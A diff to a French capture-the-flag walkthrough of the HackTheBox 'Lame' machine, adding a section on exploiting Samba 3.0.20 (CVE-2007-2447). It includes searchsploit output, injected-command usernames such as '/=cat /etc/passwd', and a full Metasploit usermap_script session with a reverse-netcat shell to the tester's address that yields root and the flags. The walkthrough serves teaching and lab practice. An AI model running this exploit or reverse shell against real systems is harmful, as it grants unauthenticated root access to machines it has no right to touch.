@@ -588,7 +588,7 @@ The Metasploit Framework is a Rapid7 Open Source Project
 msf >
 ```
 
-
+L’exploitation via **Metasploit** se fait selon le déroulement habituel : `search` pour identifier le module, `use` pour le charger, `show options` pour vérifier les paramètres attendus, `set` pour configurer la cible, puis `run` pour lancer le test.
 
 ```bash
 msf > search vsftpd 2.3.4
@@ -675,7 +675,7 @@ msf exploit(unix/ftp/vsftpd_234_backdoor) > run
 msf exploit(unix/ftp/vsftpd_234_backdoor) > 
 ```
 
-<br>
+#### Conclusion
 
 Le test avec le module **Metasploit** `vsftpd_234_backdoor` confirme le résultat obtenu avec le PoC Python : aucune session n’est créée et aucun service n’apparaît sur le port attendu. La backdoor **vsftpd 2.3.4** n’est donc pas exploitable sur cette machine, ce qui permet d’écarter définitivement la piste FTP.
 
@@ -685,16 +685,182 @@ L’exploitation via FTP n’ayant pas abouti, l’analyse se poursuit logiqueme
 
 ### SMB
 
+L’exploitation via FTP n’ayant pas abouti, tu poursuis l’analyse avec le service **SMB**. Tu appliques alors la même démarche que précédemment : identifier les vulnérabilités connues à l’aide de `searchsploit`, **examiner et comprendre comment fonctionne la vulnérabilité**, **lancer un PoC si possible**, puis utiliser **Metasploit** pour être complet et confirmer l’exploitabilité.
+
+#### Searchsploit
+
+```bash
+searchsploit samba 3.0.20
+----------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                             |  Path
+----------------------------------------------------------------------------------------------------------- ---------------------------------
+Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                     | multiple/remote/10095.txt
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                           | unix/remote/16320.rb
+Samba < 3.0.20 - Remote Heap Overflow                                                                      | linux/remote/7701.txt
+Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                              | linux_x86/dos/36741.py
+----------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+La recherche avec `searchsploit` met en évidence plusieurs vulnérabilités affectant **Samba 3.0.20**. Parmi celles-ci, une entrée se distingue particulièrement : une vulnérabilité permettant l’exécution de commandes à distance via le mécanisme **`username map script`**, avec un **module Metasploit directement disponible**.
+
+Comme pour la piste FTP, tu commences par récupérer le script référencé par `searchsploit` afin de comprendre précisément le fonctionnement de la vulnérabilité avant toute tentative d’exploitation.
+
+```basic
+searchsploit -m unix/remote/16320.rb
+```
+
+La lecture du script montre qu’il s’agit d’un **module Metasploit** exploitant la vulnérabilité **CVE-2007-2447**, liée au mécanisme **`username map script`** de Samba.
+
+Lorsque cette option est activée, Samba exécute un script externe en utilisant le **nom d’utilisateur fourni**, et ce **avant toute authentification**. Dans les versions vulnérables, cette valeur n’est pas correctement filtrée, ce qui permet d’y injecter des commandes système.
+
+Concrètement, au lieu d’un simple nom d’utilisateur, tu peux fournir une chaîne contenant une commande, par exemple `/=whoami` ou `/=cat /etc/passwd`. Cette commande est alors exécutée avec les **privilèges du service Samba, c’est-à-dire root**, ce qui permet une **exécution de commandes à distance sans identifiants valides**.
+
+#### POC
+
+Il est important de noter que le script **`16320.rb`** est un **module Metasploit** à part entière. Tu ne peux donc pas l’exécuter seul pour réaliser un PoC indépendant : son exploitation passe obligatoirement par **Metasploit**, qui se charge de la communication SMB, de l’injection du nom d’utilisateur malveillant et de l’exécution des commandes sur la cible.
+
+#### Métasploit
+
+Pour exploiter cette vulnérabilité via **Metasploit**, tu appliques exactement la même procédure que pour FTP : **rechercher** le module avec `search`, **le charger** avec `use`, **consulter les options** avec `show options`, **configurer les paramètres nécessaires** avec `set`, puis **lancer l’exploitation** avec `run`.
+
+```bash
+msf > search samba 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
 
 
-## Escalade de privilèges
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
 
-Une fois connecté en SSH en tant que `jkr`, tu appliques la méthodologie décrite dans la recette
-   {{< recette "privilege-escalation-linux" >}}.
+msf > use 0
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf exploit(multi/samba/usermap_script) > show options
 
-### Sudo -l
+Module options (exploit/multi/samba/usermap_script):
 
-La première étape consiste toujours à vérifier les droits `sudo` :
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:
+                                       host:port[,type:host:port][..
+                                       .]. Supported proxies: socks4
+                                       , socks5, socks5h, http, sapn
+                                       i
+   RHOSTS                    yes       The target host(s), see https
+                                       ://docs.metasploit.com/docs/u
+                                       sing-metasploit/basics/using-
+                                       metasploit.html
+   RPORT    139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.0.241    yes       The listen address (an interfac
+                                     e may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(multi/samba/usermap_script) > set RHOSTS lame.htb
+RHOSTS => lame.htb
+msf exploit(multi/samba/usermap_script) > set LHOST tun0
+LHOST => 10.10.17.246
+msf exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:
+                                       host:port[,type:host:port][..
+                                       .]. Supported proxies: socks4
+                                       , socks5, socks5h, http, sapn
+                                       i
+   RHOSTS   lame.htb         yes       The target host(s), see https
+                                       ://docs.metasploit.com/docs/u
+                                       sing-metasploit/basics/using-
+                                       metasploit.html
+   RPORT    139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.17.246     yes       The listen address (an interfac
+                                     e may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(multi/samba/usermap_script) > run
+[*] Started reverse TCP handler on 10.10.17.246:4444 
+[*] Command shell session 1 opened (10.10.17.246:4444 -> 10.129.70.64:40485) at 2026-02-05 17:26:52 +0100
+
+
+```
+
+Une fois la session ouverte, tout devient immédiat. Tu vérifies d’abord le contexte d’exécution et constates que tu disposes directement des **privilèges root**. À partir de là, l’arborescence du système est entièrement accessible : il te suffit de parcourir les répertoires utilisateurs pour récupérer le flag utilisateur, puis d’accéder au répertoire `/root` afin de récupérer le flag final.
+
+```bash
+whoami
+root
+pwd
+/
+ls -l /home/
+total 16
+drwxr-xr-x 2 root    nogroup 4096 Mar 17  2010 ftp
+drwxr-xr-x 4 makis   makis   4096 Feb  5 06:25 makis
+drwxr-xr-x 2 service service 4096 Apr 16  2010 service
+drwxr-xr-x 3    1001    1001 4096 May  7  2010 user
+
+ls -l /home/makis
+total 4
+-rw-r--r-- 1 makis makis 33 Feb  5 03:58 user.txt
+
+cat /home/makis/user.txt       
+899bxxxxxxxxxxxxxxxxxxxxxxxx7743
+
+cat /root/root.txt
+67c4xxxxxxxxxxxxxxxxxxxxxxxx9acf
+
+```
+
+
+
+#### Conclusion
+
+La vulnérabilité **Samba `username map script`** te permet d’exécuter des commandes à distance **sans aucune authentification**, directement avec les **privilèges root**. Dans ce challenge, elle représente le vecteur d’attaque décisif : une fois exploitée, tu obtiens immédiatement un contrôle total de la machine, sans avoir besoin d’étapes d’élévation de privilèges supplémentaires.
+
+
 
 
 ---
